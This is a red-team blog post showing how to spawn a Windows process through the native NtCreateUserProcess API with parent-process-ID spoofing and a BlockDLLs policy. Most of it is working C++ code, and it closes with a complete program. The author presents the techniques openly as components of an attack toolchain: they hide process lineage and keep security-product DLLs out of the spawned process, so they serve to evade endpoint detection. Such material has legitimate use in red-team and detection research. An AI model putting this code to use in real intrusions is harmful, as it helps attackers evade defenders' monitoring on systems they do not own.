---
title: "PPID Spoofing & BlockDLLs with NtCreateUserProcess"
date: 2022-05-12T17:26:06+01:00
draft: false
authors:
    - RastaMouse
---

This week, [Capt. Meelo](https://twitter.com/CaptMeelo) released a great [blog post](https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html) on how to call the NtCreateUserProcess API as a substitue for the typical Win32 [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) API.  This post will build upon Meelo's, so I highly encourage you to read it first.

TL;DR, this code (not counting `ntdll.h`) is the bare minimum to spawn `mmc.exe`:

```c++
#include <Windows.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

int main()
{
	UNICODE_STRING NtImagePath;
	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	HANDLE hProcess, hThread = NULL;
	NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlDestroyProcessParameters(ProcessParameters);
}
```

If you're going to use this technique as part of an attack toolchain, integrating PPID spoofing and/or BlockDLLs are potentially useful.  This is something we've known how to do with the CreateProcess API for a [long time](https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec), but there's not much consumable information about how to do this with NtCreateUserProcess.

>> Before we continue, note that I made the following modifications to Meelo's PoC:
>>
>> 1. Reduced the default `PS_ATTRIBUTE` array size from 2 to 1 in `ntdll.h:1305`.
>> 2. Changed `AttributeList->TotalLength` from `sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE)` to `sizeof(PS_ATTRIBUTE_LIST)` in `main.cpp:19`.
>>

This just helps us keep track a little easier of how many process attributes we're providing and the buffer size required to hold them.  In this PoC, we only have 1 attribute:  `PS_ATTRIBUTE_IMAGE_NAME` which points to the `NtImagePath` of the process we want to start.  As such, the `PS_ATTRIBUTE` array size only needs to be 1; the call to `RtlAllocateHeap` only needs to allocate enough for 1 `PS_ATTRIBUTE` (`sizeof(PS_ATTRIBUTE)`); and therefore the `AttributeList->TotalLength` is simply `sizeof(PS_ATTRIBUTE_LIST)`.  In short, we shouldn't need to take off the size of `PS_ATTRIBUTE` because our array size is larger than it needs to be.

## Parent Process

To spawn a process as a child of another process, we use the `PsAttributeParentProcess` `PS_ATTRIBUTE_NUM` and provide the HANDLE to the parent.  This could be done with `NtOpenProcess`.

```c++
OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, 0, 0, 0, 0);

CLIENT_ID cid = { (HANDLE)10104, NULL };

HANDLE hParent = NULL;
NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);
```

>> Note: I've just hardcoded 10104, whch is the PID for explorer.exe.

Because we're adding a new attribute, we need to bump the `PS_ATTRIBUTE` size back to up 2; and the call to `RtlAllocateHeap` now needs to allocate enough room for **2** `PS_ATTRIBUTE`'s, i.e:  `sizeof(PS_ATTRIBUTE)*2`.

The attributes to add are simple:

```c++
AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
AttributeList->Attributes[1].Size = sizeof(HANDLE);
AttributeList->Attributes[1].ValuePtr = hParent;
```

Where `PS_ATTRIBUTE_PARENT_PROCESS` is already defined in `ntdll.h`.

![](/images/ntcreateuserprocess/mmc-parent.png "PPID Spoof")

## BlockDLLs

To add a process mitigation policy, we need the `PsAttributeMitigationOptions` `PS_ATTRIBUTE_NUM`, however the macro defined in Meelo's `ntdll.h` is:

```c++
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, TRUE)
```

This produces a value of `0x60010`, but [@passthehashbrwn](https://twitter.com/passthehashbrwn) pointed out on Twitter that the value required to make BlockDLLs work is acually `0x20010`.  You can of course just hardcode this value, but I also found you can arrive there using:

```c++
#define PS_ATTRIBUTE_MITIGATION_OPTIONS_2 \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)
```

As before, adding the attributes is simple:

```c++
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
AttributeList->Attributes[2].Size = sizeof(DWORD64);
AttributeList->Attributes[2].ValuePtr = &policy;
```

![](/images/ntcreateuserprocess/mmc-blockdlls.png "BlockDLLs")

## Final Code

```c++
#include <Windows.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

int main()
{
	// define strings
	UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");
	RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Windows\\System32");
	RtlInitUnicodeString(&CommandLine, (PWSTR)L"\"C:\\Windows\\System32\\mmc.exe\"");

	// user process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// process create info
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// initialise attribute list
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)*3);
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	
	// set image name
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	// obtain handle to parent
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);

	CLIENT_ID cid = { (HANDLE)10104, NULL };
	
	HANDLE hParent = NULL;
	NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);

	// add parent process attribute
	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	AttributeList->Attributes[1].Size = sizeof(HANDLE);
	AttributeList->Attributes[1].ValuePtr = hParent;

	// blockdlls policy
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// add process mitigation atribute
	AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
	AttributeList->Attributes[2].Size = sizeof(DWORD64);
	AttributeList->Attributes[2].ValuePtr = &policy;

	// spawn process
	HANDLE hProcess, hThread = NULL;
	NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

	// close handle to parent
	CloseHandle(hParent);

	// free allocated memory
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlDestroyProcessParameters(ProcessParameters);
}
```

## Conclusion

This post demonstrated how to spawn a process with PPID Spoofing and BlockDLLs using the NtCreateUserProcess API.

>> CreateProcessW is dead, long live NtCreateUserProcess.

Shout-out to @CaptMeelo and @passthehashbrwn.